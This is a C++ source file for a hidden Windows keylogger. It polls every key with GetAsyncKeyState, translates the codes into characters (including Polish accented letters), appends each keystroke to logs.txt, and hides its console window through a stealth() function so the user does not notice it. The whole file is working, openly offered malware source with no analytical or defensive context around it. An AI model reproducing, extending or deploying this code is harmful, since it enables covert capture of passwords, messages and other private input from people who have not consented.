#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>

bool is_capslock = false;

int save(int key)
{
	std::ofstream out_file;
	out_file.open("logs.txt", std::ios_base::app);
	std::string logs = "";

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0){
		is_capslock = true;
	}

	switch (key) {
	case 1:
		return 0;
		break;
	case 2:
		return 0;
		break;
	//-----------------------------------------------------------------------
	//End of mouse
	//-----------------------------------------------------------------------
	case 96:
		logs += "0";
		break;
	case 97:
		logs += "1";
		break;
	case 98:
		logs += "2";
		break;
	case 99:
		logs += "3";
		break;
	case 100:
		logs += "4";
		break;
	case 101:
		logs += "5";
		break;
	case 102:
		logs += "6";
		break;
	case 103:
		logs += "7";
		break;
	case 104:
		logs += "8";
		break;
	case 105:
		logs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of numpad digits
	//-----------------------------------------------------------------------
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += ")";
		}
		else
			logs += "0";
		break;
	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "!";
		}
		else
			logs += "1";
		break;
	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "@";
		}
		else
			logs += "2";
		break;
	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "#";
		}
		else
			logs += "3";
		break;
	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "$";
		}
		else
			logs += "4";
		break;
	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "%";
		}
		else
			logs += "5";
		break;
	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "^";
		}
		else
			logs += "6";
		break;
	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "&";
		}
		else
			logs += "7";
		break;
	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "*";
		}
		else
			logs += "8";
		break;
	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "(";
		}
		else
			logs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of digits
	//-----------------------------------------------------------------------
	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ą";
			}
			else 
				logs += "A";
		} 
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ą";
			}
			else
				logs += "a";
		}
		break;
	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "B";
		}
		else
			logs += "b";
		break;
	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ć";
			}
			else {
				logs += "C";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ć";
			}
			else {
				logs += "c";
			}
		}
		break;
	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "D";
		}
		else
			logs += "d";
		break;
	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ę";
			}
			else {
				logs += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ę";
			}
			else {
				logs += "e";
			}
		}
		break;
	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "F";
		}
		else
			logs += "f";
		break;
	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "G";
		}
		else
			logs += "g";
		break;
	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "H";
		}
		else
			logs += "h";
		break;
	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "I";
		}
		else
			logs += "i";
		break;
	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "J";
		}
		else
			logs += "j";
		break;
	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "K";
		}
		else
			logs += "k";
		break;
	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ł";
			}
			else {
				logs += "L";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ł";
			}
			else {
				logs += "l";
			}
		}
		break;
	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "M";
		}
		else
			logs += "m";
		break;
	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ń";
			}
			else {
				logs += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ń";
			}
			else {
				logs += "n";
			}
		}
		break;
	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ó";
			}
			else {
				logs += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ó";
			}
			else {
				logs += "o";
			}
		}
		break;
	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "P";
			break;
		}
		else
			logs += "p";
		break;
	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "Q";
			break;
		}
		else
			logs += "q";
		break;
	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "R";
			break;
		}
		else
			logs += "r";
		break;
	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ś";
			}
			else {
				logs += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ś";
			}
			else {
				logs += "s";
			}
		}
		break;
	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "T";
			break;
		}
		else
			logs += "t";
		break;
	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "€";
			}
			else {
				logs += "u";
			}
		}
		break;
	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "V";
			break;
		}
		else
			logs += "v";
		break;
	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "W";
			break;
		}
		else
			logs += "w";
		break;
	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ź";
			}
			else {
				logs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ź";
			}
			else {
				logs += "x";
			}
		}
		break;
	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "Y";
			break;
		}
		else
			logs += "y";
		break;
	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "Ż";
			}
			else {
				logs += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "ż";
			}
			else {
				logs += "z";
			}
		}
	//-----------------------------------------------------------------------
	//End of A-Z characters
	//-----------------------------------------------------------------------
	case 13:
		logs += "\n";
		break;
	case 20:
		if (is_capslock == false) {
			is_capslock = true;
			logs += "[CapsLock]";
		}
		else {
			is_capslock = false;
			logs += "[/CapsLock]";
		}
		break;
	case 32:
		logs += " ";
		break;
	default:
		break;
	}
	
	out_file << logs;
	out_file.close();
	return 0;
}

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int main(int argc, char * argv[]) {
	//path to our .exe is in argv[0]
	stealth();
	char i;
	while (1) {
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				save(i);
		}
	}
	return 0;
}
